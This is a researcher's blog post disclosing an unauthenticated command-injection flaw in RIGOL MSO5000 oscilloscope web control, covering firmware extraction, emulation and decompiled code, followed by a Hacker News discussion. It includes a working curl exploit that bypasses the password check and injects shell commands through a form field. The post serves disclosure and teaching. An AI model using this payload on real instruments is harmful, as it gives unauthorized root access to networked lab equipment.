=== Content from tortel.li_38ee1c1b_20250111_060334.html ===

[tortel.li](https://tortel.li/)

[About](/about/)

[twitter](https://twitter.com/kriive)
[github](https://github.com/kriive)
[instagram](https://instagram.com/manuelromei)
[mastodon](https://fosstodon.org/%40kriive)
[rss](https://tortel.li/index.xml)

# Unauthenticated RCE on a RIGOL oscilloscope

Feb 8, 2023

I work in a company that uses custom electronic boards, so there are plenty of instruments floating around that electrical engineers employ to debug faulty connections and solderings.

One kind of tools used are the oscilloscopes, tools that measure signals and plot them in a graphically understandable way. We have a bunch of them, yet only one model in particular caught my attention, because it has a web interface!

![](/rigol_web_control.png)

I was super curious so I decided to try and (digitally) crack it open. I headed to the [vendor firmware downloads page](https://www.rigolna.com/firmware/), selected the MSO5000 firmware and waited for my browser to complete the download.

The downloaded file ends in .GEL, and I have never seen that extension before. `file` thinks it’s a tar archive, so let’s try to use `binwalk -e` and extract what’s inside.

```
$ tree --charset=ascii .
.
`-- _DS5000Update.GEL.extracted
    |-- 0.tar
    |-- app.img.gz
    |-- fw4linux.sh
    |-- fw4uboot.sh
    |-- logo.hex.gz
    |-- system.img.gz
    `-- zynq.bit.gz
1 directory, 7 files

```

The `app.img.gz` looked intersting and after extraction, in fact turned out containing the binaries for the web control application.

After extracting the `app.img.gz` with `p7zip`, I used `binwalk -e` again (it actually asked to install [this tool](https://github.com/jrspruitt/ubi_reader) before allowing me to extract the files) and this was the resulting folder.

```
$ tree --charset=ascii -L 2 .
.
`-- app
    |-- appEntry
    |-- cups
    |-- default
    |-- drivers
    |-- K160M_TOP.bit
    |-- mail
    |-- Qt5.5
    |-- resource
    |-- shell
    |-- tools
    `-- webcontrol
10 directories, 2 files

```

Hooray! The `webcontrol` folder looks promising. And in fact here there are all the files needed in order to launch the webcontrol application.

## Let’s try to emulate it!

We will use `qemu` and `chroot` in combination in order to emulate the oscilloscope software without having to brick a real oscilloscope.

But before tinkering with `qemu`, we need to have an exact copy of the internal memory of the oscilloscope, in order to have all the correct libraries installed.

Extract the `system.img` file we found before with `binwalk -e`. It will contain a file named `rootfs.img`, which is an ext2 image.

Mount and copy the rootfs image with `mkdir mount && sudo mount rootfs.img mount/ && cp -r mount rootfs && sudo umount mount`. This should be the result.

```
$ tree -L 1 --charset=ascii
.
|-- bin
|-- checkapp
|-- dev
|-- etc
|-- home
|-- lib
|-- licenses
|-- linuxrc -> bin/busybox
|-- lost+found
|-- media
|-- mnt
|-- opt
|-- proc
|-- rigol
|-- root
|-- sbin
|-- sys
|-- tmp
|-- ubifs-util
|-- user
|-- usr
`-- var
20 directories, 2 files

```

Now, let’s try to emulate something with `qemu`, like a shell.

Make sure to install `qemu qemu-user-static binfmt-support`. If you’re using Ubuntu: `sudo apt install qemu qemu-user-static binfmt-support`.

Then copy `qemu-arm-static` to a place inside the rootfs, so when we `chroot` into the folder, it will be found.

```
sudo cp /usr/bin/qemu-arm-static ./rootfs/bin

```

Then use `sudo chroot . sh` to emulate a shell.

```
~/rootfs
$ sudo chroot . sh
/ # ls
bin         home        lost+found  proc        sys         usr
checkapp    lib         media       rigol       tmp         var
dev         licenses    mnt         root        ubifs-util
etc         linuxrc     opt         sbin        user
/ # whoami
root
/ # uname -a
Linux pwnOS 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 armv7l GNU/Linux
/ #

```

Perfect, we have a functioning rootfs. Let’s try to execute some RIGOL software. Copy the `/webcontrol` folder we found in the `app.img` file into `rootfs/rigol`, don’t copy it to the rootfs root, otherwise ld.so complains for some reason.

```
sudo cp -r ~/Downloads/osc/app/webcontrol ./rootfs/rigol

```

If we looked inside the `app.img` dump, we would have found a file named `app/shell/start.sh` that is responsible to launch the main components of the oscilloscope. In that file, we can see the part that launches the web control application.

```
############################################
#Start webcontrol service
############################################
DATA_FILE=/rigol/data/user.conf
if [ ! -f $DATA_FILE ]; then
	cp /rigol/default/user.conf /rigol/data/
	sync
fi
/rigol/webcontrol/sbin/lighttpd -f /rigol/webcontrol/config/lighttpd.conf &

```

*By default, the file `/rigol/default/user.conf` contains only
`admin:rigol` (which are the default credentials of the web application).Let’s create a new file `/rigol/webcontrol/config/user.conf` with `admin:rigol`*

Let’s try to launch the webcontrol!

```
# Let's use -D to avoid letting the server go in the background.
sudo chroot . /rigol/webcontrol/sbin/lighttpd -D -f /rigol/webcontrol/config/lighttpd.conf

```

![The emulated web server, we did it!](/rigol_web_control_emulated.png)

We did it! Since we now have a functioning RIGOL web control application, let’s start to look for bugs.

While I could have started anywhere, I was intrigued by the `cgi-bin` folder. I fired up my Ghidra instance and I loaded every `cgi-bin` entry into it.

After a bit of unsuccessful fiddling and checking for buffer uses (I was aiming for a memory corruption vulnerability), I found some strange stuff on `changepwd.cgi`.

Let’s load it on Ghidra.

## The vulnerability

This binary gets executed every time the user wants to change their password.

First of all we need to find the `main` function. Luckily, symbols are left intact in this, so we don’t have to guess too much. The main function is a little bit strange: turns out that this binary uses [this library](https://github.com/boutell/cgic) to handle CGI programming in C.

As the project’s `README` [says](https://github.com/boutell/cgic#how-to-write-a-cgic-application), the developer’s custom code starts in the function `cgiMain()`. Let’s find it.

![The disassembly](/changepwd-bin.png)

The call to `system` looks super suspicious. The author basically wanted a quick way to write `admin:user_password` inside the `path` file (`/rigol/data/user.conf`). It does this by launching a shell and executing `echo admin:user_password > /rigol/data/user.conf`.

```
n = strlen(pass0);
iVar2 = strncmp(saved_pwd,pass0,n);
if (iVar2 == 0) {
    sprintf(&CMD_BUF,"echo admin:%s > %s",pass1,path);
    system(&CMD_BUF);
    system("sync");
    puts("OK");
}
else {
    puts("Old password is wrong");
}

```

If an attacker passing something like `; whoami #`  as `pass1`, they could execute arbitrary commands on the underlying system.

But, in order to reach that command injection vulnerability we need to pass the `strncmp` check that checks `pass0` against the saved password.

As per the manual, the `int strncmp(const char s1, const char s2, size_t n)` function compares the first `n` characters of the two strings. It is a little less known that if `n` is 0, the result of the `strncmp` function is also 0.

Can we force `n` to be 0?

Yes, if we manage to control `pass0`. If we passed an empty `pass0`, the `strlen` function would return 0 and that 0 would get passed as the `n` parameter to the `strncmp` function, letting us bypass the check!

So, we need to check whether we actually control `pass0` and `pass1`. If we scroll up a little bit we find these two assignments.

```
pcVar1 = (char *)read_item_value("pass0",256);
strcpy(pass0,pcVar1);
pcVar1 = (char *)read_item_value("pass1",256);
strcpy(pass1,pcVar1);

```

`read_item_value` is basically a wrapper around [`cgiFormString`](https://github.com/boutell/cgic#cgiFormString). If we provide the `pass0` and `pass1` form values in our HTTP request, we’re set.

```
char* read_item_value(char* param,int size) {
  // cmd_str is a global allocated buffer.
  memset(cmd_str,0,0x100);
  cgiFormString(param,cmd_str,size);
  return cmd_str;
}

```
## The exploit

So, in the end, we control everything! A simple `curl` command is enough to hack an RIGOL oscilloscope through the RIGOL Web Control, without being authenticated at all.

```
curl http://localhost/cgi-bin/changepwd.cgi -d "pass0=" -d "pass1=; whoami; id; uname -a # "

```

![pwned](/exploit.png)

## Timeline

* Vulnerability found, 11/8/22
* Sent detailed PoC, 11/9/22
* RIGOL says they would have contacted me with updates from R&D, 11/9/22
* Follow-up on the vulnerability, 1/25/23
* RIGOL says they would reply in 2-3 days, 1/28/23
* Full disclosure, 2/8/23

## Conclusion

Do not expose your RIGOL oscilloscopes to the internet.

## Trivia

I also made [a CTF challenge](https://github.com/havce/havceCTF/tree/master/scope) based on this vulnerability.

[←filepath.Clean: terms and conditions apply](https://tortel.li/post/dirty_filepath/)
[Fastbin dup with tcache→](https://tortel.li/post/fastbin_dup/)

© 2023
[tortel.li](https://tortel.li/)

[Powered by Hugo️️](https://gohugo.io/)️
[✎ Paper](https://github.com/nanxiaobei/hugo-paper)



=== Content from news.ycombinator.com_cc6fa785_20250111_060333.html ===


| |  | **[Hacker News](news)** [new](newest) | [past](front) | [comments](newcomments) | <ask> | <show> | <jobs> | <submit> | [login](login?goto=item%3Fid%3D36745664) | | --- | --- | --- | |
| --- | --- | --- | --- |
|
| |  |  | [Unauthenticated RCE on a RIGOL oscilloscope](https://tortel.li/post/insecure-scope/) ([tortel.li](from?site=tortel.li)) | | --- | --- | --- | |  | | 237 points by [jandeboevrie](user?id=jandeboevrie) [on July 16, 2023](item?id=36745664)  | [hide](hide?id=36745664&goto=item%3Fid%3D36745664) | [past](https://hn.algolia.com/?query=Unauthenticated%20RCE%20on%20a%20RIGOL%20oscilloscope&type=story&dateRange=all&sort=byDate&storyText=false&prefix&page=0) | [favorite](fave?id=36745664&auth=9db34150df69c008acf86384332b436f0427974c) | [136 comments](item?id=36745664) |  | |  |  | [qwezxcrty](user?id=qwezxcrty) [on July 16, 2023](item?id=36751909)   | [next](#36755402) [–]  Most test equipments, ancient or recent, are not expecting their programming interfaces, let it be an analog voltage, GPIB, RS232, USB or LAN, exposed to the public internet and it would be a extremely stupid thing to do so. The maker of them assume that if one is able to operate them, one should know where they should plug the cables in. These equipments are simply assuming that anyone can access the interface is not hostile. This is a pretty good assumption in most lab settings that I know, unless the operator is so ignorant. This assumption certainly have made my life much easier in the lab, of course, where every LXI test equipments are connected to a isolated LAN. I would say a lot more f\*k in the lab if I have to authenticate myself before sending a SCPI command. I'm happy that most test equipment makers do agree with me. For example, modern Rohde&Schwartz gears running Windows or Linux (FSV, FSW, FSVA, FSUP, SMA, SMC, ZNL, etc.) have VNC or Windows RDP enabled by default, and have a weak default password shared among the series. Keysight ones too (E5071C, DSOX3000T, maybe not on by default but with a supported way). A hostile user can even screw up a LAN connected, damn simple VxWorks based multimeter like Agilent 34410A badly by sending the calibration commands at the wrong time or some backdoor commands (DIAG:xxxx, haven't tried but looks possible). Slightly off topic, some Chinese test equipment makers are making hackability as a feature, look at Siglent or Rigol scopes. They can (and they are competent enough to) lock down the system with secure boot like some Tektronix ones. However they don't, so that people with less budget can buy a cheaper model and hack for the bandwidth. | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [myself248](user?id=myself248) [on July 17, 2023](item?id=36753412)   | [parent](#36751909) | [next](#36753160) [–]  Then it simply should not have a password. If everyone who can access it is benign by definition, simply remove the access control. Having a password implies that it provides some meaningful security. A bad lock is worse than no lock, because it will lead people to put the instrument in inappropriate places. | | --- | --- | --- | | | |  |  | [qwezxcrty](user?id=qwezxcrty) [on July 17, 2023](item?id=36758434)   | [root](#36751909) | [parent](#36753412) | [next](#36758163) [–]  I agree to some extent, that's why no one put a password to the telnet based LXI SCPI command interface. But a weak password maybe useful sometimes, to prevent your coworker accidentally connect to the wrong equipment and mess up one's experiment. Here it's never meant to deter a hostile coworker, in that case one reports to one's superior rather than rely on the password which is always stickered to the scope itself (in my lab). | | --- | --- | --- | | | |  |  | [Suzuran](user?id=Suzuran) [on July 17, 2023](item?id=36758163)   | [root](#36751909) | [parent](#36753412) | [prev](#36758434) | [next](#36753160) [–]  Having a password makes it less likely that the script that your co-worker got in their email and ran behind your firewall will destroy your stuff as a side effect of scanning your network for things it can destroy. | | --- | --- | --- | | | |  |  | [technion](user?id=technion) [on July 17, 2023](item?id=36753160)   | [parent](#36751909) | [prev](#36753412) | [next](#36752316) [–]  My issue with these "they don't need to worry about security" issues is that this issue is at its core still an obvious bug. If your password generator puts a ; in your password your attempt to set it will break. I went through a similar argument with an intranet product that "didn't need to worry about SQL because it's on a trusted network" crashed when Bob O'Reilly tried to make an account. | | --- | --- | --- | | | |  |  | [TheRealPomax](user?id=TheRealPomax) [on July 16, 2023](item?id=36752316)   | [parent](#36751909) | [prev](#36753160) | [next](#36755402) [–]  Then maybe RIGOL should not make assumptions and not release a device with near-trivially insecure firmware. | | --- | --- | --- | | | |  |  | [jfim](user?id=jfim) [on July 17, 2023](item?id=36753097)   | [root](#36751909) | [parent](#36752316) | [next](#36755402) [–]  People don't buy Rigol because they want a secure device, they just want a low cost oscilloscope. | | --- | --- | --- | | | |  |  | [TheRealPomax](user?id=TheRealPomax) [on July 17, 2023](item?id=36759676)   | [root](#36751909) | [parent](#36753097) | [next](#36755402) [–]  People don't buy a fridge because they want a secure device either, that doesn't mean the manufacturer doesn't have a legal duty of care when releasing software with security vulnerabilities. | | --- | --- | --- | | | |  |  | [oliv3r](user?id=oliv3r) [on July 17, 2023](item?id=36755402)   | [prev](#36751909) | [next](#36748611) [–]  As most have already written here, this is no suprise. These devices are made to do one job. The whole IoT thing is just cause it something that was hyped. They did try to lock down the scope \_a little\_. E.g. they removed the incoming RX resistor so you couldn't use the console. They disabled SSH etc. But the scope is very hackable, both in terms of the mentioned unlock ability, but also in terms of accessling Linux. The fact that this is about a RCE, is 'troublesome' but also 'meh'. I'm mostly disappointment that the author didn't do any research. While I get the cool-factor of trying to hack the firmware from scratch, a simple search would have found the author the EEVblog [0] for starters. But i admit, it is 104 pages atm. And the biggest dissapointment, an obviously shameless plug, is that this 'reversing' of the firmware, was done more then 5 years ago [1] where I wrote scripts to extract the whole firmware automatically. There's even rumor that the entire source code has leaked onto the internet already. I would expect some research would have made this 'discovery' less of an 'omg there's an RCE!' [0]: [https://www.eevblog.com/forum/testgear/hacking-the-rigol-mso...](https://www.eevblog.com/forum/testgear/hacking-the-rigol-mso5000-series-oscilloscopes/) [1]: <https://gitlab.com/riglol/rigolee/firmware/> | | --- | --- | --- | | | |  |  | [kriive](user?id=kriive) [on July 17, 2023](item?id=36759217)   | [parent](#36755402) | [next](#36748611) [–]  Hey! Congrats on the reverse engineering work and all the time you put in your research. As you and many other people have already said, RIGOL scopes are not exactly a security fortress, so this exploit I've found isn't impressive at all. After finding the vuln, I checked online if someone else had already found the vuln, and I admit I have come across the EEVblog, but I didn't find the exact vuln I found (I also must admit I didn't read all the posts there). I am sorry if I have in some way disrespected your work, but it wasn't my intention at all! | | --- | --- | --- | | | |  |  | [hadrien01](user?id=hadrien01) [on July 16, 2023](item?id=36748611)   | [prev](#36755402) | [next](#36750642) [–]  I was very confused by the date format, so here's the timeline with ISO dates: Vulnerability found, 2022-11-08 Sent detailed PoC, 2022-11-09 RIGOL says they would have contacted me with updates from R&D, 2022-11-09 Follow-up on the vulnerability, 2023-01-25 RIGOL says they would reply in 2-3 days, 2023-01-28 Full disclosure, 2023-02-08 | | --- | --- | --- | | | |  |  | [stavros](user?id=stavros) [on July 16, 2023](item?id=36748691)   | [parent](#36748611) | [next](#36750642) [–]  Does this mean they never patched this, then? | | --- | --- | --- | | | |  |  | [jjoonathan](user?id=jjoonathan) [on July 16, 2023](item?id=36751278)   | [root](#36748611) | [parent](#36748691) | [next](#36749111) [–]  This is RIGOL we are talking about. In a year, they will release a firmware that solves the RCE but opens two more and also breaks cursors (or some other very basic thing). A year after that, they will release a second firmware that fixes the cursors but breaks the calibration and still has the two new RCEs. | | --- | --- | --- | | | |  |  | [anitil](user?id=anitil) [on July 16, 2023](item?id=36752596)   | [root](#36748611) | [parent](#36751278) | [next](#36749111) [–]  In my experience this is most firmware vendors | | --- | --- | --- | | | |  |  | [psychphysic](user?id=psychphysic) [on July 16, 2023](item?id=36749111)   | [root](#36748611) | [parent](#36748691) | [prev](#36751278) | [next](#36763162) [–]  So odd to list a timeline but not enough detail to work out what happened. | | --- | --- | --- | | | |  |  | [Eduard](user?id=Eduard) [on July 16, 2023](item?id=36751287)   | [root](#36748611) | [parent](#36749111) | [next](#36749342) [–]  It's pretty clear to work out what happened from the timeline listed: RIGOL didn’t do shit. The style the author chose to list the timeline is IMHO the most faithful, honest, and polite way of communicating it without adding wrong or legally problematic reasoning to the situation, from their perspective. | | --- | --- | --- | | | |  |  | [psychphysic](user?id=psychphysic) [on July 16, 2023](item?id=36751454)   | [root](#36748611) | [parent](#36751287) | [next](#36749342) [–]  Nah, "no response received from RIGOL" if that's the case is faithful, honest and polite. | | --- | --- | --- | | | |  |  | [ericpauley](user?id=ericpauley) [on July 16, 2023](item?id=36749342)   | [root](#36748611) | [parent](#36749111) | [prev](#36751287) | [next](#36763162) [–]  Such is life with CVEs, unfortunately. While there are some great central repositories of information there is often very little in the way of consistent information on the disclosure process itself. | | --- | --- | --- | | | |  |  | [mensi](user?id=mensi) [on July 17, 2023](item?id=36763162)   | [root](#36748611) | [parent](#36748691) | [prev](#36749111) | [next](#36750642) [–]  I actually reported the same pair of bugs to them 2021-03-01, so I don't think they're interested in fixing it... | | --- | --- | --- | | | |  |  | [cesaref](user?id=cesaref) [on July 16, 2023](item?id=36750642)   | [prev](#36748611) | [next](#36748039) [–]  Instruments like this normally boot from a read only image, so even if you have root access to the box you can't do anything bad to it, well, nothing that won't disappear on reboot. On my Siglent scope (an SDS2104X plus) you can easily hack it to enable telnet access. This requires physical access to the device to add a USB stick with a file on it to achieve this, but it's then very open (described here [https://www.eevblog.com/forum/testgear/siglent-sds2000x-plus...](https://www.eevblog.com/forum/testgear/siglent-sds2000x-plus-coming/825/)) It was actually one of the things that attracted me to this scope, that it was to some extent hackable. Compared to other scopes like the old Tektronix ones running VxWorks it's nice to have something familiar behind the scenes. | | --- | --- | --- | | | |  |  | [LeifCarrotson](user?id=LeifCarrotson) [on July 16, 2023](item?id=36752261)   | [parent](#36750642) | [next](#36748039) [–]  Exactly! A curl 1-liner to get root access to the Linux shell running on my Rigol scope (an older 1074Z-S...do I even have a webserver?) Think of all the awesome things I could do! This security vulnerability does not make me worried, it makes me happy. Rigols have always been somewhat hackable, this is an even easier way to do it. | | --- | --- | --- | | | |  |  | [\_trampeltier](user?id=_trampeltier) [on July 16, 2023](item?id=36748039)   | [prev](#36750642) | [next](#36745851) [–]  I think such devices anyway have anything lost in a companys LAN. Before such devices had a serial link to a PC. Now every device is in the office LAN. They can never be secure for the many years they are in service. | | --- | --- | --- | | | |  |  | [throwaway9870](user?id=throwaway9870) [on July 16, 2023](item?id=36749204)   | [parent](#36748039) | [next](#36749433) [–]  It has been like that since the 90s. At Stanford we had a sysadmin track down a warez site to our HP logic analyzer. Everything at Stanford in the 90s had a public IP address (at least in EE). | | --- | --- | --- | | | |  |  | [kjs3](user?id=kjs3) [on July 16, 2023](item?id=36750381)   | [root](#36748039) | [parent](#36749204) | [next](#36749433) [–]  Probably an HP 16600/16700[1]. The control processor is basically a repackaged HP-PA workstation running a full version of HP/UX. Used X11 for remote access. The earlier 16500 had an optional, separate equivalent processor. I have a 16702A, which includes a front panel LCD and keyboard console. It's a beast. [1] [https://www.keysight.com/us/en/product/16700A/logic-analysis...](https://www.keysight.com/us/en/product/16700A/logic-analysis-system.html) | | --- | --- | --- | | | |  |  | [montzark](user?id=montzark) [on July 16, 2023](item?id=36749433)   | [parent](#36748039) | [prev](#36749204) | [next](#36745851) [–]  Maybe easy fix would be some certification requirement for routers that by default ports to device are closed even from same network? Some time ago there was issue with default passwords and it got solved with default passwords unique to device. | | --- | --- | --- | | | |  |  | [\_trampeltier](user?id=_trampeltier) [on July 16, 2023](item?id=36750886)   | [root](#36748039) | [parent](#36749433) | [next](#36745851) [–]  Such devices can also be attacked in a second stage from a compromised PC or so. Such devices have nothing lost in a production LAN at all. | | --- | --- | --- | | | |  |  | [Towaway69](user?id=Towaway69) [on July 16, 2023](item?id=36745851)   | [prev](#36748039) | [next](#36750388) [–]  Nice writeup and explanation how to get firmware outside of the hardware. Bypassing strncmp was particularly insightful. | | --- | --- | --- | | | |  |  | [meithecatte](user?id=meithecatte) [on July 16, 2023](item?id=36747773)   | [parent](#36745851) | [next](#36747494) [–]  I don't think it's strncmp itself that's the problem. They fucked up and are only checking that the provided password matches a prefix of the stored password. And obviously an empty string is a matching prefix. | | --- | --- | --- | | | |  |  | [colonwqbang](user?id=colonwqbang) [on July 16, 2023](item?id=36748341)   | [root](#36745851) | [parent](#36747773) | [next](#36747494) [–]  The (decompiled) code looks very amateurish in general. Like, who writes something like system("echo >... or system("sync"). Looks like something written by a very green engineer/intern and not reviewed by anyone else. | | --- | --- | --- | | | |  |  | [randomhacker123](user?id=randomhacker123) [on July 16, 2023](item?id=36749081)   | [root](#36745851) | [parent](#36748341) | [next](#36749307) [–]  Sadly this looks like "industry standard" to me. I have seen many embedded Linux devices using mostly C applications and a lot of usage of the system() function with no or very poor input validation before. When you want to exploit embedded Linux devices always look for calls to system() first. The "strncmp(saved\_pwd,pass0,strlen(pass0))" looks equally bad. Probably someone did not understood the advice "always check the length first" and just did it everywhere. Intel AMT checked the password in a similar way some time ago: [https://www.tenable.com/blog/rediscovering-the-intel-amt-vul...](https://www.tenable.com/blog/rediscovering-the-intel-amt-vulnerability) | | --- | --- | --- | | | |  |  | [colonwqbang](user?id=colonwqbang) [on July 16, 2023](item?id=36750727)   | [root](#36745851) | [parent](#36749081) | [next](#36750130) [–]  Embedded Linux engineers in general are not incompetent. Many of us do care about quality of the software we write. Although you are right that there is a lot of dodgy embedded software around, that isn't a reason to accept mediocrity like this in newly written user facing APIs. | | --- | --- | --- | | | |  |  | [jacquesm](user?id=jacquesm) [on July 16, 2023](item?id=36750130)   | [root](#36745851) | [parent](#36749081) | [prev](#36750727) | [next](#36749307) [–]  Many of these faults are simply the consequence of never reading the manpage of a function but making assumptions about implementation details of an imaginary version of a function with the same name. | | --- | --- | --- | | | |  |  | [fest](user?id=fest) [on July 16, 2023](item?id=36751966)   | [root](#36745851) | [parent](#36750130) | [next](#36749307) [–]  Though, in this case, manpage doesn't exactly spell out that two strings of which one is 0 chars long results in a match. I often remember my PHP days in horror, but mysqli\_query manpage does warn you about SQL-injections now. | | --- | --- | --- | | | |  |  | [jacquesm](user?id=jacquesm) [on July 17, 2023](item?id=36753001)   | [root](#36745851) | [parent](#36751966) | [next](#36749307) [–]  It does actually. "The strncmp() function is similar, except it compares only the first (at most) n bytes of s1 and s2." Possibly it's years of string wrangling in C that sets me up here for being biased towards the compact way in which the C manpages state what the function will do, but 'early termination' because of zero length strings for comparisions returns 0 just as sure as comparing "" and "" would. And that 0 indicates a match... | | --- | --- | --- | | | |  |  | [fest](user?id=fest) [on July 19, 2023](item?id=36794211)   | [root](#36745851) | [parent](#36753001) | [next](#36749307) [–]  Of course an experienced developer would have thought about edge cases, but I can see a thought process like: ok, I'm comparing two strings. "" != "123" in languages with built-in string types. I'm definitely not arguing that C shouldn't be used and everybody should be using <insert-the-currently-trendy-systems-programming-language>: just thinking out loud if improved documentation could prevent at least some of the common footguns. | | --- | --- | --- | | | |  |  | [bri3d](user?id=bri3d) [on July 16, 2023](item?id=36749307)   | [root](#36745851) | [parent](#36748341) | [prev](#36749081) | [next](#36747494) [–]  I have never seen firmware from any vendor in any industry that doesn't use these patterns. There's a lot to unpack culturally around "hardware company engineers" vs "software company engineers," but I don't think this is "amateurish" so far as it is "industry standard from another industry." | | --- | --- | --- | | | |  |  | [13of40](user?id=13of40) [on July 16, 2023](item?id=36747494)   | [parent](#36745851) | [prev](#36747773) | [next](#36750810) [–]  Was I reading it wrong, or does the system actually store a clear text copy of the password instead of a hash? | | --- | --- | --- | | | |  |  | [Towaway69](user?id=Towaway69) [on July 16, 2023](item?id=36747620)   | [root](#36745851) | [parent](#36747494) | [next](#36750810) [–]  It would appear to be clear text with the assumption that no one can login onto the device. I assume the manufacturer makes this assumption. | | --- | --- | --- | | | |  |  | [galangalalgol](user?id=galangalalgol) [on July 16, 2023](item?id=36747995)   | [root](#36745851) | [parent](#36747620) | [next](#36750810) [–]  Storing a salted hash would be nice, but scopes without ntp or internal wall clocks are the norm, so not sure what to salt with. And a plain hash is pretty easy to beat right? As far as getting the hash, these are people who are using oscopes, it doesn't seem unlikely they could jtag it out without some decent safeguards in place. Worrying about physical security on an oscope seems like a bad risk management trade. | | --- | --- | --- | | | |  |  | [mlyle](user?id=mlyle) [on July 16, 2023](item?id=36748382)   | [root](#36745851) | [parent](#36747995) | [next](#36750810) [–]  > so not sure what to salt with Scopes have massive amounts of true random data at their disposal. :P This isn't a nonce where you might need some kind of special timing properties. We hash so that people can't grab your password and use it elsewhere. We add some salt to make the hash more robust to memory and precomputation attacks. | | --- | --- | --- | | | |  |  | [dmvdoug](user?id=dmvdoug) [on July 16, 2023](item?id=36750810)   | [parent](#36745851) | [prev](#36747494) | [next](#36750388) [–]  I’m sorry, but your comment came right after the comment thread about a guy printing gay porn and I thought you were making a joke and I was giggling about the firmware and hardware thing and then I realized you were making a serious point. | | --- | --- | --- | | | |  |  | [DominoTree](user?id=DominoTree) [on July 16, 2023](item?id=36750388)   | [prev](#36745851) | [next](#36747730) [–]  [https://pbs.twimg.com/media/EkUjA7rVoAA6FF6?format=jpg&name=...](https://pbs.twimg.com/media/EkUjA7rVoAA6FF6?format=jpg&name=large) | | --- | --- | --- | | | |  |  | [amelius](user?id=amelius) [on July 16, 2023](item?id=36747730)   | [prev](#36750388) | [next](#36747560) [–]  Also don't expose your Xerox printers to the internet (they will auto install user-hostile "upgrades") | | --- | --- | --- | | | |  |  | [ComputerGuru](user?id=ComputerGuru) [on July 16, 2023](item?id=36748234)   | [parent](#36747730) | [next](#36748088) [–]  Not just that - they can ~all be bricked remotely unless running the latest updates!! CVE-2022-23968: [https://neosmart.net/blog/xerox-vulnerability-allows-unauthe...](https://neosmart.net/blog/xerox-vulnerability-allows-unauthenticated-network-users-to-remotely-brick-printers/) | | --- | --- | --- | | | |  |  | [fmx](user?id=fmx) [on July 16, 2023](item?id=36750222)   | [root](#36747730) | [parent](#36748234) | [next](#36748088) [–]  The timeline of this vulnerability might just be the best argument I've ever seen for full disclosure: ```   2019-09-26 Reported to vendor with POC   2020-01-14 Followed up with vendor   2022-01-24 Publicly disclosed (still no fix over 2 years later!)   2022-01-28 Fix released by vendor  ``` I wonder if the same will happen with this RIGOL oscilloscope vulnerability. | | --- | --- | --- | | | |  |  | [samstave](user?id=samstave) [on July 16, 2023](item?id=36748088)   | [parent](#36747730) | [prev](#36748234) | [next](#36747560) [10 more]  [flagged] | | --- | --- | --- | | | |  |  | [blueflow](user?id=blueflow) [on July 16, 2023](item?id=36748238)   | [root](#36747730) | [parent](#36748088) | [next](#36750125) [–]  ... which sick kind of person is *printing porn to paper* instead of watching it on a screen like any normal person? | | --- | --- | --- | | | |  |  | [sekh60](user?id=sekh60) [on July 16, 2023](item?id=36748431)   | [root](#36747730) | [parent](#36748238) | [next](#36750125) [–]  My late father-in-law did. Interestingly enough he did not print out emails, which is behaviour I kinda expect would go together. | | --- | --- | --- | | | |  |  | [DANmode](user?id=DANmode) [on July 16, 2023](item?id=36749179)   | [root](#36747730) | [parent](#36748431) | [next](#36750635) [–]  Perhaps he didn't feel any risk of dirtying his device while reading emails. | | --- | --- | --- | | | |  |  | [eastbound](user?id=eastbound) [on July 16, 2023](item?id=36750635)   | [root](#36747730) | [parent](#36748431) | [prev](#36749179) | [next](#36750125) [–]  He clearly didn’t take his emails to bed. | | --- | --- | --- | | | |  |  | [jacquesm](user?id=jacquesm) [on July 16, 2023](item?id=36750125)   | [root](#36747730) | [parent](#36748088) | [prev](#36748238) | [next](#36749147) [–]  Not the kind of disclosure you want to make on a website where there are a ton of people who are able to narrow this down to a handful of individuals. Not everybody on HN is nice. Also quite unprofessional. | | --- | --- | --- | | | |  |  | [psychphysic](user?id=psychphysic) [on July 16, 2023](item?id=36749147)   | [root](#36747730) | [parent](#36748088) | [prev](#36750125) | [next](#36747560) [–]  > He was an EVP there, who was married with kids. Maybe he's bi. | | --- | --- | --- | | | |  |  | [samstave](user?id=samstave) [on July 16, 2023](item?id=36749951)   | [root](#36747730) | [parent](#36749147) | [next](#36747560) [–]  Sure, no judgement, but not openly so, except after this - and his was literally printing out the home pages of sites so it just showed thumbnails of the vids.. obv. So I assume he was closeted (he was like 60 or so) and I assume he used the pages for fap material without an accidental phone copy - this was also the Treo and flip phone era - 2006 so IPhone hadn’t come out yet | | --- | --- | --- | | | |  |  | [psychphysic](user?id=psychphysic) [on July 16, 2023](item?id=36750051)   | [root](#36747730) | [parent](#36749951) | [next](#36747560) [–]  Maybe an accident? Cltr + p and clicking okay or whatever. But what does it mean to be openly bi as a married man? No one in my office knows of my sexual past and what gets me hard, they might know I have a girlfriend. I'd be more concerned if someone the office was aware of his sexuality in detail. Usually means there has been sexual harassment. | | --- | --- | --- | | | |  |  | [samstave](user?id=samstave) [on July 17, 2023](item?id=36763017)   | [root](#36747730) | [parent](#36750051) | [next](#36747560) [–]  >\*No one in my office knows of my sexual past and what gets me hard\* Yep - its nobody's business - it was just that it was not even in the zeitgeist until he printed those - but luckily for him, it was lit btwn me (IT head), HR and whomever else was on his team/mgmt struct... But I bet that guy suffered from cringe-thoughts-on-mistake for a few years to come. As we all do. (ever cringe toss and turn over a stupid comment you made 20+ years ago?) (No? many people dont, but some people do... I am one of the some people) | | --- | --- | --- | | | |  |  | [remram](user?id=remram) [on July 16, 2023](item?id=36747560)   | [prev](#36747730) | [next](#36751099) [–]  I'm a bit confused about the timeline at the bottom, was the vulnerability patched? | | --- | --- | --- | | | |  |  | [Mathnerd314](user?id=Mathnerd314) [on July 16, 2023](item?id=36747715)   | [parent](#36747560) | [next](#36751099) [–]  It looks like they never replied to him for months so he just published it. This would also fit with the HN title (conclusion in the post). I think if it was patched it would be "I found a bug". | | --- | --- | --- | | | |  |  | [pmontra](user?id=pmontra) [on July 16, 2023](item?id=36748200)   | [root](#36747560) | [parent](#36747715) | [next](#36747836) [–]  From the timeline > RIGOL says they would reply in 2-3 days, 1/28/23 > Full disclosure, 2/8/23 Those should be January 28 2023 and February 8 2023, which is the date of the post. It's only 13 days after the last communication from RIGOL, not months. By the way, could at least us developers use ISO dates instead of whatever our local conventions are? | | --- | --- | --- | | | |  |  | [mlyle](user?id=mlyle) [on July 16, 2023](item?id=36748361)   | [root](#36747560) | [parent](#36748200) | [next](#36759279) [–]  > It's only 13 days after the last communication from RIGOL, not months. 3 months of total stalling without a real reply to him. The last communication was only that they'd provide more details in a few days. The fact that he asked again before the disclosure timeframe and they were like "uh, just give us a minute" 